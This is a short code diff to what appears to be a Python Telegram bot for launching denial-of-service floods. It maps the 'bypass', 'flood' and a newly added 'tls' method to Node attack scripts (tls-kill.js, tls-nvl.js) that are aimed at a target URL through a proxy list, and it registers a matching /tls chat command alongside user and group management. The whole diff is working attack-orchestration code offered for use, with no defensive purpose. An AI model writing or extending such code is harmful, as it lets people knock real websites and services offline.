@@ -45,7 +45,8 @@ async def run_attack(url, attack_time, update, method, context):
     heap_size = "--max-old-space-size=8192"
     commands = {
         'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt bypass",
-        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt flood"
+        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt flood",
+        'tls': f"node {heap_size} tls-nvl.js {url} {attack_time} 10 10 live.txt tls",
     }
 
     command = commands.get(method)
@@ -316,6 +317,7 @@ def main():
     application = ApplicationBuilder().token(TOKEN).build()
     application.add_handler(CommandHandler("flood", attack))
     application.add_handler(CommandHandler("bypass", attack))
+    application.add_handler(CommandHandler("tls", attack))
     application.add_handler(CommandHandler("stop", stop))
     application.add_handler(CommandHandler("addgroup", add_group))
     application.add_handler(CommandHandler("adduser", add_user_admin))
